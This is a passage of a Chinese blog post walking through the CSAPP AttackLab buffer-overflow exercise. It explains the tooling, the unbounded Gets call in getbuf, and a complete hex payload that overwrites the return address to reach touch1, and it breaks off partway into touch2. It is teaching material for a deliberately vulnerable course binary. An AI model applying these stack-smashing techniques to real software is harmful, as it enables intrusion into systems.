@@ -1,0 +1,472 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="实验三，利用缓冲区溢出来篡改程序"><title>⚔️ CSAPP AttackLab 实验指南</title><link rel=canonical href=https://ovideros.site/p/csapp_attacklab/><link rel=stylesheet href=/scss/style.min.790079a55df2d46ca5ebac3d71f31f500e903ad49de7ac8029b46ba107a3c192.css><meta property='og:title' content="⚔️ CSAPP AttackLab 实验指南"><meta property='og:description' content="实验三，利用缓冲区溢出来篡改程序"><meta property='og:url' content='https://ovideros.site/p/csapp_attacklab/'><meta property='og:site_name' content="Ovidero's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='csapp'><meta property='article:published_time' content='2025-12-12T00:00:00+00:00'><meta property='article:modified_time' content='2025-12-12T00:00:00+00:00'><meta property='og:image' content='https://ovideros.site/p/csapp_attacklab/stack.png'><meta name=twitter:title content="⚔️ CSAPP AttackLab 实验指南"><meta name=twitter:description content="实验三，利用缓冲区溢出来篡改程序"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://ovideros.site/p/csapp_attacklab/stack.png'><link rel="shortcut icon" href=/android-chrome-192x192.png><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/tippy.js@6.3.7/dist/tippy.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/tippy.js@6.3.7/dist/themes/light-border.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/tippy.js@6.3.7/animations/shift-away.css></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_95dfa1f8f033ce16.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>😇</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ovidero's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/ovideros target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#实验介绍与准备>实验介绍与准备</a></li><li><a href=#常用工具>常用工具</a><ol><li><a href=#反汇编>反汇编</a></li><li><a href=#构造任意字符串序列>构造任意字符串序列</a></li><li><a href=#根据汇编生成字符串序列>根据汇编生成字符串序列</a></li></ol></li><li><a href=#目标程序>目标程序</a></li><li><a href=#ctarget-touch1>ctarget-touch1</a></li><li><a href=#ctarget-touch2>ctarget-touch2</a></li><li><a href=#ctarget-touch3>ctarget-touch3</a></li><li><a href=#rtarget-touch2>rtarget-touch2</a></li><li><a href=#rtarget-touch3>rtarget-touch3</a></li><li><a href=#参考资料>参考资料</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/csapp_attacklab/><img src=/p/csapp_attacklab/stack_hu_ae7030dc889c5bf1.png srcset="/p/csapp_attacklab/stack_hu_ae7030dc889c5bf1.png 800w, /p/csapp_attacklab/stack_hu_2d931d121f99e6dd.png 1600w" width=800 height=360 loading=lazy alt="Featured image of post ⚔️ CSAPP AttackLab 实验指南"></a></div><div class=article-details><header class=article-category><a href=/categories/%E5%AD%A6%E4%B9%A0/ style=background-color:#2a9d8f;color:#fff>学习</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/csapp_attacklab/>⚔️ CSAPP AttackLab 实验指南</a></h2><h3 class=article-subtitle>实验三，利用缓冲区溢出来篡改程序</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>2025年12月12日</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 14 分钟</time></div></footer></div></header><section class=article-content><blockquote><p>⚠️ 注意，本文只提供个人的解法与思路，不能代替自己亲手用调试器做实验。如果你希望更好地锻炼自己的能力，仅仅在你尝试过，并且被卡住时候，观看对应章节的内容。或者，在你独立做完实验，可以与本指南中的内容核对。也欢迎各位对本文中的拼写错误、细节遗漏等方面进行补充！</p></blockquote><p>本文所有内容都是手写，但最后一部分 rtarget-touch3 向 AI 询问过思路。</p><p>本文编写时没有参考 <a class=link href=https://arthals.ink/blog/attack-lab target=_blank rel=noopener>更适合北大宝宝体质的 Attack Lab 踩坑记</a>，不过各位可以自行参考。</p><h2 id=实验介绍与准备>实验介绍与准备</h2><p>该实验的目的是通过制造一些独特的输入字符串，进而在调用 getbuf 函数的时候修改栈上的值，进而操纵程序，达到指定的效果。主要考核的是 CSAPP 第三章缓冲区溢出部分。</p><p>根据希冀平台，实验提供的文件如下：</p><ul><li>README.txt：描述本目录内容的文件。</li><li>ctarget：一个容易遭受code-injection攻击的可执行程序。</li><li>rtarget：一个容易遭受return-oriented-programming攻击的可执行程序。</li><li>cookie.txt：一个8位的十六进制码，在后面解题会用到.</li><li>farm.c：你的目标“gadget farm”的源代码，在产生return-oriented programming攻击时会用到。</li><li>hex2raw：一个生成攻击字符串的工具。</li></ul><p>以下指南基于读者拥有 BombLab 的基础，参考 <a class=link href=https://ovideros.site/p/csapp_bomblab/>💣 CSAPP BombLab 实验指南</a>。以及，调试器使用 pwndbg，参考 <a class=link href=https://ovideros.site/p/pwndbg/>pwndbg 教程与自定义配置</a>。</p><h2 id=常用工具>常用工具</h2><h3 id=反汇编>反汇编</h3><p>使用 objdump 命令来反汇编：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>objdump -d ctarget &gt; ctarget.s
+</span></span></code></pre></td></tr></table></div></div><h3 id=构造任意字符串序列>构造任意字符串序列</h3><p>使用本实验提供的 hex2raw 程序，从十六进制序列生成相应的字符串。可以利用 linux 的文件重定向来调用程序，指定输入与输出文件<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./hex2raw &lt; exploit.txt &gt; exploit-raw.txt
+</span></span></code></pre></td></tr></table></div></div><p>这里只需要将十六进制文件放到 <code>exploit.txt</code> 中，例如是下面的序列：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>37 38 39 3a 3b 3c 00
+</span></span></code></pre></td></tr></table></div></div><p>每两个字符代表一个位，使用空格、换行符来分割。最后生成的 <code>exploit-raw.txt</code> 文件可以作为 ctarget 或者 rtarget 程序的输入。</p><h3 id=根据汇编生成字符串序列>根据汇编生成字符串序列</h3><p>可以首先编写一个汇编程序，编译，再反编译。例如，创建汇编文件 <code>example.s</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=c1># Example of hand-generated assembly code
+</span></span></span><span class=line><span class=cl><span class=nf>pushq</span>   <span class=no>$0xabcdef</span>             <span class=c1># Push value onto stack
+</span></span></span><span class=line><span class=cl><span class=nf>addq</span>    <span class=no>$17</span><span class=p>,</span><span class=nv>%rax</span>              <span class=c1># Add 17 to %rax
+</span></span></span><span class=line><span class=cl><span class=nf>movl</span>    <span class=nv>%eax</span><span class=p>,</span><span class=nv>%edx</span>             <span class=c1># Copy lower 32 bits to %edx
+</span></span></span></code></pre></td></tr></table></div></div><p>利用生成汇编文件 <code>example.o</code>，再反汇编命令得到 <code>example.d</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc -c example.s<span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>objdump -d example.o &gt; example.d
+</span></span></code></pre></td></tr></table></div></div><p><code>example.d</code>中有下面的部分：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0000000000000000 &lt;.text&gt;:
+</span></span><span class=line><span class=cl>   0: 68 ef cd ab 00             pushq  $0xabcdef
+</span></span><span class=line><span class=cl>   5: 48 83 c0 11                add    $0x11,%rax
+</span></span><span class=line><span class=cl>   9: 89 c2                      mov    %eax,%edx
+</span></span></code></pre></td></tr></table></div></div><p>这当中的字节序列就是 <code>68 ef cd ab 00 48 83 c0 11 89 c2</code>，可以将这部分作为 hex2raw 的输入。</p><h2 id=目标程序>目标程序</h2><p>本实验需要攻克 ctarget 与 rtarget 两个程序。两个程序都使用 getbuf 函数读取字符串：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=nf>getbuf</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>BUFFER_SIZE</span><span class=p>];</span> 
+</span></span><span class=line><span class=cl>    <span class=nf>Gets</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>其中的 Gets 函数从标准输入读取字符串，直到遇到 <code>\n</code> 或者 <code>\0</code> 结束。该函数并不会有输入的上限，因此输入的字符串可能会超出 BUFFER_SIZE 大小，进而改变栈上的内容。</p><p>运行 ctarget 或者 rtarget 程序，如果输入字符串足够短，getbuf 会返回1：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>unix$ ./ctarget
+</span></span><span class=line><span class=cl>Cookie: 0x5534d1f8
+</span></span><span class=line><span class=cl>Type string:Keep it short!
+</span></span><span class=line><span class=cl>No exploit. Getbuf returned 0x1
+</span></span><span class=line><span class=cl>Normal return
+</span></span></code></pre></td></tr></table></div></div><p>如果输入太长，会发生段错误：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>unix$ ./ctarget
+</span></span><span class=line><span class=cl>Cookie: @x5534d1f8
+</span></span><span class=line><span class=cl>Type string:This is not a very interesting string, but it has the property ... Ouch!: You caused a segmentation fault!
+</span></span><span class=line><span class=cl>Ouch!: You caused a segmentation fault!
+</span></span><span class=line><span class=cl>Better luck next time
+</span></span><span class=line><span class=cl>FAILED
+</span></span></code></pre></td></tr></table></div></div><p>实验的目的就是构造字符串，利用缓冲区溢出来修改栈上内容，达成期望的目的。</p><p>两个程序有命令行参数 <code>-i FILE</code>，其中 <code>FILE</code> 是输入文件的路径。可以用这个方法来方便调试。例如，使用 hex2raw 生成了 <code>exploit1-raw.txt</code> 文件，可以在 <code>~/.gdbinit</code> 文件中编辑，利用下面的方式来设置调试的时候使用命令行参数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>set args -i exploit1-raw.txt
+</span></span></code></pre></td></tr></table></div></div><h2 id=ctarget-touch1>ctarget-touch1</h2><p>这一部分攻击 ctarget 程序，需要更改 getbuf 的返回值对应的栈，不再返回 test 函数，而是返回到另一个函数 touch1。</p><p>getbuf 函数对应汇编为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>000000000040167</span><span class=nf>f</span> <span class=err>&lt;</span><span class=no>getbuf</span><span class=err>&gt;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=err>40167</span><span class=nl>f:</span>	<span class=err>48</span> <span class=err>83</span> <span class=nf>ec</span> <span class=mi>18</span>          	<span class=no>sub</span>    <span class=no>$0x18</span><span class=p>,</span><span class=nv>%rsp</span>
+</span></span><span class=line><span class=cl>  <span class=err>401683:</span>	<span class=err>48</span> <span class=err>89</span> <span class=nf>e7</span>             	<span class=no>mov</span>    <span class=nv>%rsp</span><span class=p>,</span><span class=nv>%rdi</span>
+</span></span><span class=line><span class=cl>  <span class=err>401686:</span>	<span class=nf>e8</span> <span class=mi>59</span> <span class=mi>02</span> <span class=mi>00</span> <span class=mi>00</span>       	<span class=no>call</span>   <span class=mh>4018e4</span> <span class=p>&lt;</span><span class=no>Gets</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=err>40168</span><span class=nl>b:</span>	<span class=nf>b8</span> <span class=mi>01</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>       	<span class=no>mov</span>    <span class=no>$0x1</span><span class=p>,</span><span class=nv>%eax</span>
+</span></span><span class=line><span class=cl>  <span class=err>401690:</span>	<span class=err>48</span> <span class=err>83</span> <span class=nf>c4</span> <span class=mi>18</span>          	<span class=no>add</span>    <span class=no>$0x18</span><span class=p>,</span><span class=nv>%rsp</span>
+</span></span><span class=line><span class=cl>  <span class=err>401694:</span>	<span class=nf>c3</span>                   	<span class=no>ret</span>
+</span></span></code></pre></td></tr></table></div></div><p>从汇编中可以看出，该函数一开始在栈上拓展了 0x18 也就是 24 字节的空间，然后调用 Gets 函数。栈的布局如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00:0000│ rsp 0x55654c98 ◂— 0
+</span></span><span class=line><span class=cl>01:0008│     0x55654ca0 ◂— 0
+</span></span><span class=line><span class=cl>02:0010│     0x55654ca8 —▸ 0x55586000 ◂— 0
+</span></span><span class=line><span class=cl>03:0018│     0x55654cb0 —▸ 0x401829 (test+1)
+</span></span></code></pre></td></tr></table></div></div><p>所以，我们可以首先输入 24 个完全无关的字符，然后开始输入真正重要的信息，让它跳转到 touch1 函数。touch1 函数汇编如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>0000000000401695</span> <span class=err>&lt;</span><span class=nf>touch1</span><span class=err>&gt;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=err>401695:</span>	<span class=err>48</span> <span class=err>83</span> <span class=nf>ec</span> <span class=mi>08</span>          	<span class=no>sub</span>    <span class=no>$0x8</span><span class=p>,</span><span class=nv>%rsp</span>
+</span></span><span class=line><span class=cl>  <span class=err>401699:</span>	<span class=nf>c7</span> <span class=mi>05</span> <span class=mi>59</span> <span class=mi>2</span><span class=no>e</span> <span class=mi>20</span> <span class=mi>00</span> <span class=mi>01</span> 	<span class=no>movl</span>   <span class=no>$0x1</span><span class=p>,</span><span class=mi>0x202e59</span><span class=p>(</span><span class=nv>%rip</span><span class=p>)</span>        <span class=c1># 6044fc &lt;vlevel&gt;
+</span></span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>a0:</span>	<span class=err>00</span> <span class=err>00</span> <span class=err>00</span> 
+</span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>a3:</span>	<span class=nf>bf</span> <span class=mi>87</span> <span class=mi>2</span><span class=no>d</span> <span class=mi>40</span> <span class=mi>00</span>       	<span class=no>mov</span>    <span class=no>$0x402d87</span><span class=p>,</span><span class=nv>%edi</span>
+</span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>a8:</span>	<span class=nf>e8</span> <span class=mi>33</span> <span class=no>f5</span> <span class=no>ff</span> <span class=no>ff</span>       	<span class=no>call</span>   <span class=mh>400be0</span> <span class=p>&lt;</span><span class=no>puts@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>ad:</span>	<span class=nf>bf</span> <span class=mi>01</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>       	<span class=no>mov</span>    <span class=no>$0x1</span><span class=p>,</span><span class=nv>%edi</span>
+</span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>b2:</span>	<span class=nf>e8</span> <span class=no>e8</span> <span class=mi>03</span> <span class=mi>00</span> <span class=mi>00</span>       	<span class=no>call</span>   <span class=mh>401a9f</span> <span class=p>&lt;</span><span class=no>validate</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>b7:</span>	<span class=nf>bf</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>       	<span class=no>mov</span>    <span class=no>$0x0</span><span class=p>,</span><span class=nv>%edi</span>
+</span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>bc:</span>	<span class=nf>e8</span> <span class=mi>6</span><span class=no>f</span> <span class=no>f6</span> <span class=no>ff</span> <span class=no>ff</span>       	<span class=no>call</span>   <span class=mh>400d30</span> <span class=p>&lt;</span><span class=no>exit@plt</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>其地址为 0x401695。注意，x86 使用小端序，也就是低地址对应的是低位的数。所以应该倒过来构造 95 16 40 00 00 &mldr; 00 这一串，前面加上任意 24 个字符即可。这里简单地使用 00 填充。</p><p>因此第一关对应的十六进制序列如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>95 16 40 00 00 00 00 00
+</span></span></code></pre></td></tr></table></div></div><p>使用新的输入，执行完 gets 后，栈变成了这样：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00:0000│ rax rsp 0x55654c98 ◂— 0
+</span></span><span class=line><span class=cl>... ↓            2 skipped
+</span></span><span class=line><span class=cl>03:0018│         0x55654cb0 —▸ 0x401695 (touch1) ◂— subq $8, %rsp
+</span></span></code></pre></td></tr></table></div></div><p>因此变成返回到 touch1 处，执行 ret 后就可以跳转到目标。</p><h2 id=ctarget-touch2>ctarget-touch2</h2><p>touch2 的 C 代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>touch2</span><span class=p>(</span><span class=kt>unsigned</span> <span class=n>val</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>vlevel</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>       <span class=cm>/* Part of validation protocol */</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>val</span> <span class=o>==</span> <span class=n>cookie</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Touch2!: You called touch2(0x%.8x)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>val</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>validate</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Misfire: You called touch2(0x%.8x)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>val</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>fail</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这一关目的是不返回 test，而是执行 touch2 代码，并且输入正确的参数。首先仿照 touch1，让代码跳转到 touch2 的地址，即 0x4016c1。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>00000000004016</span><span class=nf>c1</span> <span class=err>&lt;</span><span class=no>touch2</span><span class=err>&gt;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>c1:</span>	<span class=err>48</span> <span class=err>83</span> <span class=nf>ec</span> <span class=mi>08</span>          	<span class=no>sub</span>    <span class=no>$0x8</span><span class=p>,</span><span class=nv>%rsp</span>
+</span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>c5:</span>	<span class=err>89</span> <span class=nf>fa</span>                	<span class=no>mov</span>    <span class=nv>%edi</span><span class=p>,</span><span class=nv>%edx</span>
